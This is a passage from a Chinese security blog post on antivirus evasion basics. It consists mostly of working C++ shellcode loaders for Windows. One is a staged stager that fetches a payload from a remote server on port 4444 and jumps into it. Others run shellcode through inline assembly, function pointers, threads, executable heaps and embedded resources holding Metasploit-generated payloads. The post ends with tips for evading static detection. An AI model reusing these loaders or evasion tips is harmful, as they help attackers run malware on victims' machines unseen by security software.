&amp;wsdata))<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartp fail.\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br><br>	<span class="hljs-comment">//申请socket，并链接</span><br>	SOCKET socket = <span class="hljs-built_in">WSASocket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>	SOCKADDR_IN server;<br>	<span class="hljs-built_in">ZeroMemory</span>(&amp;server, <span class="hljs-built_in">sizeof</span>(SOCKADDR_IN));<br>	server.sin_family = AF_INET;<br>	server.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;X.X.X.X&quot;</span>); <span class="hljs-comment">//server ip</span><br>	server.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">4444</span>); <span class="hljs-comment">//server port</span><br>	<span class="hljs-keyword">if</span> (SOCKET_ERROR == <span class="hljs-built_in">connect</span>(socket, (SOCKADDR*)&amp;server, <span class="hljs-built_in">sizeof</span>(server)))<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect to server fail.\n&quot;</span>);<br>		<span class="hljs-keyword">goto</span> Fail;<br>	&#125;<br>	<br>	<span class="hljs-comment">//接收长度</span><br>	u_int stagelength;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">recv</span>(socket, (<span class="hljs-type">char</span>*)&amp;stagelength, <span class="hljs-built_in">sizeof</span>(stagelength), <span class="hljs-number">0</span>) != <span class="hljs-built_in">sizeof</span>(stagelength))<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv error\n&quot;</span>);<br>		<span class="hljs-keyword">goto</span> Fail;<br>	&#125;<br><br>	<span class="hljs-comment">//分配空间，以接收真正载荷</span><br>	<span class="hljs-type">char</span>* orig_buffer;<br>	orig_buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, stagel ength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>	<span class="hljs-type">char</span>* stage_buf;<br>	stage_buf = orig_buffer;<br>	<span class="hljs-type">int</span> ret;<br>	ret = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">do</span><br>	&#123;<br>		ret = <span class="hljs-built_in">recv</span>(socket, stage_buf, stagelength, <span class="hljs-number">0</span>);<br>		stage_buf += ret;<br>		stagelength -= ret;<br>	&#125; <span class="hljs-keyword">while</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; stagelength &gt; <span class="hljs-number">0</span>);<br><br><br>	<span class="hljs-comment">//传入参数，并执行载荷</span><br>	__asm<br>	&#123;<br>		mov edi, socket;   <span class="hljs-comment">//socket 存放在edi中</span><br>		jmp orig_buffer; <span class="hljs-comment">//执行权转移到 载荷中，不要指望它返回。如果想要它返回，修改量比较大，不如把这个地方做成个线程,监听端设置退出时ExitThread更方便</span><br>	&#125;<br><br>	<span class="hljs-comment">//释放空间</span><br>	<span class="hljs-built_in">VirtualFree</span>(orig_buffer, <span class="hljs-number">0</span>, MEM_RELEASE);<br><br>Fail:<br><br>	<span class="hljs-built_in">closesocket</span>(socket);<br>	<span class="hljs-built_in">WSACleanup</span>();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="基础加载器"><a href="#基础加载器" class="headerlink" title="基础加载器"></a>基础加载器</h3><h4 id="1、内联汇编加载"><a href="#1、内联汇编加载" class="headerlink" title="1、内联汇编加载"></a>1、内联汇编加载</h4><p>使用内联汇编只能加载32位程序的ShellCode，因为64位程序不支持写内联汇编</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>) <span class="hljs-comment">//将data段的内存设置成可读可写可执行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <br>	__asm &#123;<br>		lea eax,buf    <span class="hljs-comment">// lea是赋予地址的操作符 将buf的地址赋值给eax寄存器</span><br>		call eax  <span class="hljs-comment">// call是函数调用操作符 调用eax，将eax里的值当作函数来执行</span><br>	&#125;<br>&#125;<br><span class="hljs-comment">// 把buf的变量所在的位置当作我们执行的空间，赋予了一个可执行的属性，然后用函数调用的方式去执行</span><br></code></pre></td></tr></table></figure>

<h4 id="2、使用函数指针加载"><a href="#2、使用函数指针加载" class="headerlink" title="2、使用函数指针加载"></a>2、使用函数指针加载</h4><p>如下代码所示，<code>(void(*)(void))</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 <code>buf</code> 的地址转换为一个函数指针，然后调用该指针所指向的函数，其实这种方法和上述加载方式原理是一样的，只不过这种方法还能用于加载64位的ShellCode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>) <span class="hljs-comment">//将data段的内存设置成可读可写可执行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<span class="hljs-string">&quot;0x??&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;   <br>	((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) &amp; buf)();  <span class="hljs-comment">//执行ShellCode</span><br>&#125;<br><span class="hljs-comment">// void(*)(void) 定义一个函数类型 函数的返回值为空 函数的参数为空 并且是一个指针函数</span><br><span class="hljs-comment">// (void(*)(void) &amp;buf 将&amp;buf强制类型转换成void(*)(void)这个指针函数的类型</span><br><span class="hljs-comment">// ((void(*)(void)) &amp;buf) () 函数调用 调用((void(*)(void)) &amp;buf)一整个函数</span><br></code></pre></td></tr></table></figure>

<h4 id="3、创建线程加载"><a href="#3、创建线程加载" class="headerlink" title="3、创建线程加载"></a>3、创建线程加载</h4><p>上述两种方法都需要将data节的内存设置成可读可写可执行, 以下这段代码的主要作用是在内存中分配一段可执行的内存空间，将buf数组中的内容复制到该内存空间，并创建一个新线程来执行这段内存中的代码</p>
<p>主要分为三步：</p>
<ul>
<li>1、申请一段新的内存空间</li>
<li>2、把shellcode复制过去</li>
<li>3、用新的线程去执行这段新的空间里的内容</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>	<span class="hljs-comment">// 申请一块可进行读写操作的内存</span><br>    LPVOID pMemory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">// 将buf数组中的内容复制到刚刚分配的内存中</span><br>    <span class="hljs-built_in">RtlMoveMemory</span>(pMemory, buf, <span class="hljs-built_in">sizeof</span>(buf));<br><br>    <span class="hljs-comment">// 创建一个新的线程来执行内存中的代码</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 设置为一直运行这个线程，除非收到Single信号才中断</span><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="4、通过堆加载"><a href="#4、通过堆加载" class="headerlink" title="4、通过堆加载"></a>4、通过堆加载</h4><p>这段代码首先创建了一个具有执行权限的堆，然后在堆中分配内存并将shellcode复制到内存中。最后，代码通过直接调用存储在内存中的shellcode来执行它 </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 创建一个具有执行权限的堆，以存储shellcode</span><br>    HANDLE HeapHandle = <span class="hljs-built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span><br>    <span class="hljs-type">char</span>* buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="hljs-built_in">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// 将shellcode复制到buffer指向的内存中</span><br>    <span class="hljs-built_in">memcpy</span>(buffer, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) buffer)();<br>    <br>    <span class="hljs-comment">// 下面是另一种创建线程的方法，这里被注释掉了</span><br>    <span class="hljs-comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span><br>    <span class="hljs-comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span><br><br>    <span class="hljs-comment">// 等待新线程执行完毕</span><br>    <span class="hljs-comment">// WaitForSingleObject(hThread, INFINITE);</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="5、基于资源节加载"><a href="#5、基于资源节加载" class="headerlink" title="5、基于资源节加载"></a>5、基于资源节加载</h4><h6 id="导入资源"><a href="#导入资源" class="headerlink" title="导入资源"></a>导入资源</h6><p>使用MSF生成bin文件，随后点击<code>VSstudio中添加资源-&gt;导入</code>，并选择生成的bin文件</p>
<img src="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/image-20240517213843599.png" srcset="/img/loading.gif" lazyload class="" title="image-20240517213843599">

<p>然后自定义bin文件的资源类型, 此处我自定义的类型为”shellcode”，当然你也可以定义成其它的名字</p>
<img src="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/image-20240517213856369.png" srcset="/img/loading.gif" lazyload class="" title="image-20240517213856369">

<p>添加完资源后会在当前项目生成一个<code>resource.h</code>, 代码如下所示，这里只需注意这段代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDR_SHELLCODE1 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><br><span class="hljs-comment">//&#123;&#123;NO_DEPENDENCIES&#125;&#125;</span><br><span class="hljs-comment">// Microsoft Visual C++ 生成的包含文件。</span><br><span class="hljs-comment">// 供 Shellcode加载器.rc 使用</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//IDR_SHELLCODE1 通常用于标识和引用项目中的某个资源，例如嵌入到可执行文件中的二进制数据、图像或其他类型的资源，在项目的其他部分（例如代码或资源脚本中），可以通过使用 IDR_SHELLCODE1 符号来引用这个资源，而不是直接使用数字常量（如 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDR_SHELLCODE1                  101</span><br><br><span class="hljs-comment">// Next default values for new objects</span><br><span class="hljs-comment">// </span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> APSTUDIO_INVOKED</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> APSTUDIO_READONLY_SYMBOLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_RESOURCE_VALUE        102</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_COMMAND_VALUE         40001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_CONTROL_VALUE         1001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_SYMED_VALUE           101</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>

<h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6><p>以下是完整shellcode加载器代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><span class="hljs-comment">//通过资源加载ShellCode</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ResourceLoader</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:</span><br><span class="hljs-comment">    HRSRC FindResource(</span><br><span class="hljs-comment">          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源</span><br><span class="hljs-comment">          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符</span><br><span class="hljs-comment">          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">    如果查找成功，则返回资源句柄；否则返回NULL</span><br><span class="hljs-comment">    */</span><br>    HRSRC Res = <span class="hljs-built_in">FindResource</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="hljs-string">L&quot;shellcode&quot;</span>);<br><br>    <span class="hljs-comment">//用于获取资源的大小</span><br>    DWORD ResSize = <span class="hljs-built_in">SizeofResource</span>(<span class="hljs-literal">NULL</span>, Res);<br><br>    <span class="hljs-comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span><br>    HGLOBAL Load = <span class="hljs-built_in">LoadResource</span>(<span class="hljs-literal">NULL</span>, Res);<br><br>    <span class="hljs-comment">//申请内存</span><br>    <span class="hljs-type">void</span>* buffer = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(buffer, Load, ResSize);<br><br>    <span class="hljs-comment">//执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) buffer)();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-built_in">ResourceLoader</span>();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>导入资源和实现代码在一个exe中</p>
<p>静态免杀：要么自己写shellcode，要么加密混淆shellcode使其解不明白，要么分离shellcode。如果检查加载器另说</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80/" class="category-chain-item">静态免杀</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shellcode/">#shellcode</a>
      
        <a href="/tags/%E5%8A%A0%E8%BD%BD%E5%99%A8/">#加载器</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>免杀基础</div>
      <div>http://example.com/2024/05/20/免杀基础/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Simply</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年5月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/05/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="java反序列化和类加载机制">
                        <span class="hidden-mobile">java反序列化和类加载机制</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"pw5wiM2PguIgoOksiuFeFaJa-gzGzoHsz","appKey":"YviqKAHsF1z7DaAKl4Ch5eSr","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://pw5wim2p.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量
        <span id="leancloud-site-pv"></span>
        次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数
        <span id="leancloud-site-uv"></span>
        人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
